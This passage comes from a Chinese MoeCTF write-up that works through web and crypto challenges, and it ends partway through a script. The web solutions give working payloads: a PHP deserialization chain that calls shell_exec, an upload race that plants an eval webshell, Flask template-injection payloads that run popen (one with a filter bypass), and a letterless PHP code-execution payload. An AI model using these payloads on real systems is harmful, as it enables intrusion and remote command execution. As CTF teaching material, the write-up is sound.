            die(&quot;Age can&#39;t be empty.&quot;);
        }
        else if($name === &quot;system&quot;)
        {
            die(&quot;Hacker!&quot;);
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this-&gt;id;//这里$name需要为personB对象触发invoke
        $name-&gt;age = $this-&gt;age;
        $name($this);//__invoke触发点,
    }
}

if(isset($_GET[&#39;person&#39;]))
{
    $person = unserialize($_GET[&#39;person&#39;]);
}
</code></pre>
<p>链尾在personC的var_dump里,在personA中动态调用$id($this-&gt;age),personC中$this是 PHP 中指向当前对象的指针</p>
<pre><code class="php">&lt;?php

class Person {
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person {}
class PersonB extends Person {}
class PersonC extends Person {}

// 嵌套对象
$p1 = new Person();
$pb = new PersonB();
$pb-&gt;id = $p1;
$pc = new PersonC();
$pc-&gt;name = &quot;shell_exec&quot;;  // 长度自动为 10
$pc-&gt;id = $pb;
$pc-&gt;age = &quot;&quot;;
$pa = new PersonA();
$pa-&gt;name = $pc;
$pa-&gt;id = &quot;check&quot;;
$pa-&gt;age = &quot;cat flag&quot;;

// 序列化
$serialized = serialize($pa);
echo $serialized . PHP_EOL;

?&gt;
O:7:&quot;PersonA&quot;:3:{s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:{s:4:&quot;name&quot;;s:10:&quot;shell_exec&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:1:{s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:{}}s:3:&quot;age&quot;;s:0:&quot;&quot;;}s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:3:&quot;env&quot;;}
</code></pre>
<p><img src="/./image-20250826123741833.png" alt="./image-20250826123741833"></p>
<pre><code>moectf{832295b9-1e23-6426-dfd4-a7385f5504cf}
</code></pre>
<h3 id="24-神秘的手镯-revenge"><a href="#24-神秘的手镯-revenge" class="headerlink" title="24.神秘的手镯_revenge"></a>24.<strong>神秘的手镯_revenge</strong></h3><p>提示</p>
<pre><code>wanyanzhou.txt里面了......但是我忘记密码是啥了，而且不小心把保存密码的文件删了......

HDdss：这...应该有备份吧？

K皇：确实有
</code></pre>
<p>访问wanyanzhou.txt.bak,得到密钥,</p>
<p><img src="/./image-20250826162619117.png" alt="./image-20250826162619117"></p>
<p>用bp抓请求包抓不到,将原来的页面按 F12 打开，发现被反调试了</p>
<p>我们右键左侧的 shouzhuo.js 向忽略列表添加脚本，然后点右侧的继续执行脚本，即可继续调试：</p>
<p><img src="/./image-20250826162804026.png" alt="./image-20250826162804026"></p>
<p>然后点设置，禁用 javascript ，将刚才的 10000 长度的密码复制进去：再bp抓包,最后发到爆破模块重复五百次NULL payload即可</p>
<p><img src="/./image-20250826162919848.png" alt="./image-20250826162919848"></p>
<pre><code>moectf{d3a28e96-b84f-5518-4c0d-c65597fd4712}
</code></pre>
<h3 id="25-第十五章-归真关·竞时净魔"><a href="#25-第十五章-归真关·竞时净魔" class="headerlink" title="25.第十五章 归真关·竞时净魔"></a>25.<strong>第十五章 归真关·竞时净魔</strong></h3><p>我们创建一个文件 1.php，只要访问就会生成一个木马文件，其内容为：</p>
<pre><code class="php">GIF89a
&lt;?php file_put_contents(&quot;2.php&quot;,&quot;&lt;?php eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;);?&gt;
</code></pre>
<p>bp抓包,改mime,然后发到爆破模块,继续用NULL payload爆破</p>
<p>然后在写一个脚本一直访问1.php</p>
<pre><code class="python">import threading, requests, time
BASE = &quot;http://127.0.0.1:57743&quot;
TARGET = BASE + &quot;/uploads/1.php&quot;
THREADS = 10
TIMEOUT = 2
stop = threading.Event()
counter = {&quot;req&quot;: 0, &quot;hit&quot;: 0}
lock = threading.Lock()
def fetcher(idx):
    sess = requests.Session()
    while not stop.is_set():
        try:
            url = f&quot;{TARGET}?_={int(time.time()*1000)}&quot;
            r = sess.get(url, timeout=TIMEOUT)
            with lock:
                counter[&quot;req&quot;] += 1
            if r.status_code == 200:
                with lock:
                    counter[&quot;hit&quot;] += 1
                print(f&quot;[HIT] Thread-{idx} got 200, len={len(r.content)}&quot;)
                print(&quot;  前20字节:&quot;, r.content[:20])
        except Exception as e:
            pass
 def reporter():
    while not stop.is_set():
        time.sleep(3)
        with lock:
            print(f&quot;[STAT] total={counter[&#39;req&#39;]} hits={counter[&#39;hit&#39;]}&quot;)
 if __name__ == &quot;__main__&quot;:
    print(&quot;[*] 疯狂访问:&quot;, TARGET)
    for i in range(THREADS):
        threading.Thread(target=fetcher, args=(i,), daemon=True).start()
    threading.Thread(target=reporter, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
        print(&quot;[*] 停止。&quot;)
</code></pre>
<p>直到返回的字节有gif89a为止,蚁剑连2.php</p>
<p><img src="/./image-20250826171107490.png" alt="./image-20250826171107490"></p>
<pre><code>
</code></pre>
<h3 id="26-第二十章-幽冥血海·幻语心魔"><a href="#26-第二十章-幽冥血海·幻语心魔" class="headerlink" title="26.第二十章 幽冥血海·幻语心魔"></a>26.<strong>第二十章 幽冥血海·幻语心魔</strong></h3><p>给了app.py</p>
<pre><code class="python">from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

@app.route(&#39;/&#39;)
def index():
    if &#39;username&#39; in request.args or &#39;password&#39; in request.args:
        username = request.args.get(&#39;username&#39;, &#39;&#39;)
        password = request.args.get(&#39;password&#39;, &#39;&#39;)

        if not username or not password:
            login_msg = &quot;&quot;&quot;
            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;
                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;
                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#39;login-fail&#39;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;
            &lt;/div&gt;
            &quot;&quot;&quot;
        else:
            login_msg = render_template_string(f&quot;&quot;&quot;
            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;
                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;
                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#39;login-success&#39;&gt;欢迎: {username}&lt;/div&gt;&lt;/div&gt;
            &lt;/div&gt;
            &quot;&quot;&quot;)
    else:
        login_msg = &quot;&quot;

    return render_template(&quot;index.html&quot;, login_msg=login_msg)

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=80)
</code></pre>
<p>username可控并且存在ssti</p>
<pre><code>{{&#39;&#39;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#39;popen&#39;](&#39;ls /&#39;).read()}}
</code></pre>
<p><img src="/./image-20250907122553225.png" alt="./image-20250907122553225"></p>
<pre><code>{{&#39;&#39;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#39;popen&#39;](&#39;cat /f*&#39;).read()}}
</code></pre>
<p><img src="/./image-20250907122617458.png" alt="./image-20250907122617458"></p>
<pre><code>moectf{a53a1e79-698c-d929-a976-4afcbddd6b32}
</code></pre>
<h3 id="27-第二十一章-往生漩涡·言灵死局"><a href="#27-第二十一章-往生漩涡·言灵死局" class="headerlink" title="27.第二十一章 往生漩涡·言灵死局"></a>27.<strong>第二十一章 往生漩涡·言灵死局</strong></h3><p>这题多了个waf</p>
<pre><code class="python">from flask import Flask, request, render_template, render_template_string
app = Flask(__name__)

blacklist = [&quot;__&quot;, &quot;global&quot;, &quot;{{&quot;, &quot;}}&quot;]

@app.route(&#39;/&#39;)
def index():
    if &#39;username&#39; in request.args or &#39;password&#39; in request.args:
        username = request.args.get(&#39;username&#39;, &#39;&#39;)
        password = request.args.get(&#39;password&#39;, &#39;&#39;)

        if not username or not password:
            login_msg = &quot;&quot;&quot;
            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;
                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;
                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#39;login-fail&#39;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;
            &lt;/div&gt;
            &quot;&quot;&quot;
        else:
            login_msg = render_template_string(f&quot;&quot;&quot;
            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;
                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;
                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#39;login-success&#39;&gt;欢迎：{username}&lt;/div&gt;&lt;/div&gt;
            &lt;/div&gt;
            &quot;&quot;&quot;)

            for blk in blacklist:
                if blk in username:
                    login_msg = &quot;&quot;&quot;
                    &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;
                        &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;
                        &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#39;login-fail&#39;&gt;Error&lt;/div&gt;&lt;/div&gt;
                    &lt;/div&gt;
                    &quot;&quot;&quot;
    else:
        login_msg = &quot;&quot;

    return render_template(&quot;index.html&quot;, login_msg=login_msg)

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=80)
</code></pre>
<pre><code>{%print (cycler.next[&#39;_&#39;+&#39;_&#39;+&#39;g&#39;&#39;lobals&#39;+&#39;_&#39;+&#39;_&#39;].os.popen(&#39;ls /&#39;)).read()%}
app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var
</code></pre>
<pre><code>{%print (cycler.next[&#39;_&#39;+&#39;_&#39;+&#39;g&#39;&#39;lobals&#39;+&#39;_&#39;+&#39;_&#39;].os.popen(&#39;cat /f*&#39;)).read()%}
</code></pre>
<p><img src="/./image-20250907125325998.png" alt="./image-20250907125325998"></p>
<pre><code>moectf{0e58bf14-90e9-97dd-a2e8-64f6708bea38}
</code></pre>
<h3 id="28-这是…Webshell？"><a href="#28-这是…Webshell？" class="headerlink" title="28.这是…Webshell？"></a>28.<strong>这是…Webshell？</strong></h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;shell&#39;])) {
    $shell = $_GET[&#39;shell&#39;];
    if(!preg_match(&#39;/[A-Za-z0-9]/is&#39;, $_GET[&#39;shell&#39;])) {
        eval($shell);
    } else {
        echo &quot;Hacker!&quot;;
    }
}
?&gt;
</code></pre>
<p>无数字无字母rce</p>
<p><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a></p>
<p>一般都是通过异或或者取反</p>
<pre><code>$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);
POST:
_=system(cat /f*);
</code></pre>
<p><img src="/./image-20250907131432404.png" alt="./image-20250907131432404"></p>
<pre><code>moectf{0f39c886-86fe-94d9-1247-062f339c9b5f}
</code></pre>
<h3 id="29-这是…Webshell-revenge"><a href="#29-这是…Webshell-revenge" class="headerlink" title="29.这是…Webshell?_revenge"></a>29.<strong>这是…Webshell?_revenge</strong></h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);

if (isset($_GET[&#39;shell&#39;])) {
    $shell = $_GET[&#39;shell&#39;];
    if (strlen($shell) &gt; 30) {
        die(&quot;error: shell length exceeded&quot;);
    }
    if (preg_match(&quot;/[A-Za-z0-9_$]/&quot;, $shell)) {
        die(&quot;error: shell not allowed&quot;);
    }
    eval($shell);
}
</code></pre>
<h2 id="3-密码"><a href="#3-密码" class="headerlink" title="3.密码"></a>3.密码</h2><h3 id="1-Crypto入门指北"><a href="#1-Crypto入门指北" class="headerlink" title="1.Crypto入门指北"></a>1.<strong>Crypto入门指北</strong></h3><pre><code class="python">from Crypto.Util.number import long_to_bytes

# 替换为你的真实参数
p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863
c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863
c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983
x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214

# ElGamal解密步骤
s = pow(c1, x, p)            # s = c1^x mod p
s_inv = pow(s, -1, p)        # 计算s的模逆
m = (c2 * s_inv) % p         # 计算明文整数m

# 转换为字节串，解码为字符串（一般UTF-8）
flag_bytes = long_to_bytes(m)
print(flag_bytes.decode())
</code></pre>
<p><img src="/./image-20250809145935983.png" alt="./image-20250809145935983"></p>
<pre><code>moectf{th1s_1s_y0ur_f1rst_ElG@m@l}
</code></pre>
<h3 id="2-baby-next"><a href="#2-baby-next" class="headerlink" title="2.baby_next"></a>2.baby_next</h3><pre><code class="python">from gmpy2 import isqrt, next_prime
from Crypto.Util.number import long_to_bytes
import math

# 题目给定的参数
n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
e = 65537

# 计算n的平方根作为p的估计值
sqrt_n = isqrt(n)

# 定义搜索范围：根据素数间隔理论，p应位于 sqrt(n) - 4e7 附近
search_range = 40000000  # 4000万
start = max(2, sqrt_n - search_range)  # 搜索起点
end = sqrt_n                            # 搜索终点

# 步骤1：在估算范围内搜索能整除n的素数
found = False
p = None
for candidate in range(start, end + 1):
    # 检查是否整除
    if n % candidate == 0:
        # 验证候选数是否为素数（小素数快速验证）
        if next_prime(candidate - 1) == candidate:
            p = candidate
            found = True
            break
    # 每处理10万个数字显示进度
    if (candidate - start) % 100000 == 0:
        progress = (candidate - start) / (end - start) * 100
        print(f&quot;扫描进度: {progress:.2f}%&quot;)

if not found:
    raise ValueError(&quot;未找到合适的素数因子p，尝试扩大搜索范围&quot;)

# 计算另一个素数因子q
q = n // p
print(f&quot;找到因子: p = {p}&quot;)
print(f&quot;q = {q}&quot;)

# 步骤2：验证q确实是p的第114514个后继素数
current = p
for count in range(1, 114515):  # 需要114514次next_prime
    current = next_prime(current)
    # 显示进度
    if count % 10000 == 0:
        print(f&quot;验证进度: {count}/114514&quot;)

if current != q:
    raise ValueError(&quot;q不是p的后继第114514个素数，请检查搜索逻辑&quot;)

print(&quot;验证通过：q是p的第114514个后继素数&quot;)
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(&quot;解密后的Flag:&quot;, flag.decode())
</code></pre>
<p><img src="/./image-20250809161214353.png" alt="./image-20250809161214353"></p>
<pre><code>moectf{vv0W_p_m1nu5_q_i5_r34l1y_sm4lI}
</code></pre>
<h3 id="3-ez-square"><a href="#3-ez-square" class="headerlink" title="3.ez_square"></a>3.<strong>ez_square</strong></h3><pre><code class="python">from Crypto.Util.number import long_to_bytes, inverse, isPrime
import math

# 已知数据
n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149
c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190
hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304
e = 65537

# 1. 枚举 k 找到 (p+q)
for k in range(1, 1000):
    s2 = hint + k * n  # s^2 = hint + k*n
    s = math.isqrt(s2)
    if s * s == s2:
        print(f&quot;[+] Found s = p+q with k={k}&quot;)
        break
else:
    raise ValueError(&quot;s not found&quot;)

# 2. 解 p,q
# s^2 - 4n = (p-q)^2
diff2 = s * s - 4 * n
t = math.isqrt(diff2)
if t * t != diff2:
    raise ValueError(&quot;Not a square for p-q&quot;)

p = (s + t) // 2
q = (s - t) // 2

assert p * q == n
assert isPrime(p) and isPrime(q)

print(&quot;[+] p =&quot;, p)
print(&quot;[+] q =&quot;, q)

# 3. 计算私钥 d
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# 4. 解密
m = pow(c, d, n)
flag = long_to_bytes(m)
print(&quot;[+] FLAG =&quot;, flag.decode())

&#39;&#39;&#39;
moectf{Ma7hm4t1c5_is_@_k1nd_0f_a2t}
&#39;&#39;&#39;
</code></pre>
<h3 id="4-ez-DES"><a href="#4-ez-DES" class="headerlink" title="4.ez_DES"></a>4.<strong>ez_DES</strong></h3><pre><code class="python">from Crypto.Cipher import DES
import itertools
import string

# 已知密文
c = b&#39;\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA&gt;\xce \rN\x83z\xa0\xdc{\xbc\xb8X\xb2\xe2q\xa4&quot;\xfc\x07&#39;

# DES key 前 5 位已知
prefix = &quot;ezdes&quot;
charset = string.ascii_letters + string.digits + string.punctuation

# 爆破后三位
for combo in itertools.product(charset, repeat=3):
    key_str = prefix + &#39;&#39;.join(combo)
    key = key_str.encode(&#39;utf-8&#39;)

    cipher = DES.new(key, DES.MODE_ECB)
    pt = cipher.decrypt(c)

    # 检查解密结果
    if b&quot;moectf{&quot; in pt:
        print(&quot;[+] Found key:&quot;, key_str)
        print(&quot;[+] Plaintext (raw):&quot;, pt)
        print(&quot;[+] Plaintext (decoded):&quot;, pt.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;))
        break
&#39;&#39;&#39;
[+] Found key: ezdes8br
[+] Plaintext (raw): b&#39;moectf{_Ju5t envmEra+e.!}\x19\x19\x19\x19\x19\x19\x19&#39;
[+] Plaintext (decoded): moectf{_Ju5t envmEra+e.!}
&#39;&#39;&#39;
</code></pre>
<h3 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h3><pre><code class="python"># recover_flag.py
from Crypto.Util.number import long_to_bytes
import math

# 已知参数（从你给出的数据粘贴）
p = 258669765135238783146000574794031096183
a = 144901483389896508632771215712413815934

ciphertext = [102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653, 207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486, 103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529, 45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405, 17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601, 121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216, 28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574, 137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433, 232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934, 222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339, 215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663, 5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850, 241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153, 202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702, 2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024, 55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634, 97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050, 133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118, 51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725, 98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555, 589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423, 238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552, 236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776, 325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702, 196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541, 117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251, 194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474, 14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185, 185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961, 119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085, 227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876, 173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776, 155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031, 252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537, 87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059, 253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034, 215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535, 174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421, 88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198, 193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666, 201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182, 202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375, 92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579, 198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768, 61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125, 134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208, 200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959, 179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524, 202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301, 196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333, 123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628, 165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164, 171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175, 9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848, 88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801, 12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750, 117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170, 50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903, 40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994, 55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255, 67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452, 58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000, 58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631, 190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278, 144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649, 47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134, 174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843, 237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221, 25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276, 169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270, 49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254, 110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613, 83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867, 179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868, 100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768, 221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516, 137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262, 197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595, 107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883, 100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037, 142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631, 171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373, 89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669, 4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089, 19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196, 252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524, 24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993, 225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331, 25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437, 11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373, 254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022, 136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799, 118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756, 240921043405288511960365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053, 43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300, 160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127, 60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041, 22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906, 221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152, 141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295, 229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030, 42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209, 59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462, 211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563, 214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148, 166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894, 79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332, 26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652, 93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669, 47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068, 75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969, 246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451]

# 1) 生成小于 2^16 的素数列表（sieve）
def gen_primes_upto(n):
    sieve = bytearray(b&#39;\x01&#39;) * (n+1)
    sieve[0:2] = b&#39;\x00\x00&#39;
    for i in range(2, int(n**0.5)+1):
        if sieve[i]:
            step = i
            start = i*i
            sieve[start:n+1:step] = b&#39;\x00&#39; * ((n - start)//step + 1)
    return [i for i, isprime in enumerate(sieve) if isprime]

primes16 = gen_primes_upto(65535)

# 2) 恢复比特串
bits = []
total = len(ciphertext)
bases = [a] + [a + d for d in range(1, 11)]  # a, a+1 .. a+10

for idx, ci in enumerate(ciphertext, 1):
    found = False
    # 尝试每个 base 与每个 16-bit 素数 e
    for base_idx, base in enumerate(bases):
        for e in primes16:
            if pow(base, e, p) == ci:
                bit = &#39;0&#39; if base_idx == 0 else &#39;1&#39;
                bits.append(bit)
                found = True
                # 可以打印调试信息
                print(f&quot;[{idx}/{total}] match: base_index={base_idx} (base={base if base_idx&lt;2 else &#39;a+&#39;+str(base-a)}), e={e}, bit={bit}&quot;)
                break
        if found:
            break
    if not found:
        # 如果没找到，说明数据粘贴有遗漏或存在其他随机性，打印并中断
        print(f&quot;[-] No match for ciphertext index {idx}&quot;)
        raise SystemExit(1)

# 3) 把 bits 拼回 bytes 并解码
bitstr = &#39;&#39;.join(bits)
bytes_list = [int(bitstr[i:i+8], 2) for i in range(0, len(bitstr), 8)]
